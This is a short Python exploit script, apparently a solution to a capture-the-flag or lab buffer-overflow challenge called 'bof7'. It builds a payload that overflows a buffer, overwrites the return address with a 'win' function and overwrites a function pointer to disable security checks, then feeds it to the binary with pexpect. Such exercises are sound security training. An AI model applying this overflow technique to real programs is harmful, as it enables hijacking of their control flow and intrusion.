#!/usr/bin/env python3
import pexpect

#setting up addresses from disassemble
win_addr = 0x080491f4.to_bytes(4,'little')
disable_security_addr = 0x080491c6.to_bytes(4,'little')
buffer_len= 0x113-0xc

#PAYLOAD to overflow print_function
PAYLOAD1 = b'A'*234+\
	b'_EBP'+\
	win_addr

#Needed later
PAYLOAD2 = b'B'*(buffer_len-len(PAYLOAD1))+\
	disable_security_addr

#PAYLOAD to override *fp and disable security checks
PAYLOAD = PAYLOAD1 + PAYLOAD2

with open('input.txt','wb') as f:
	f.write(PAYLOAD)

io = pexpect.spawn('./bof7')
io.sendline(PAYLOAD)
io.interact()
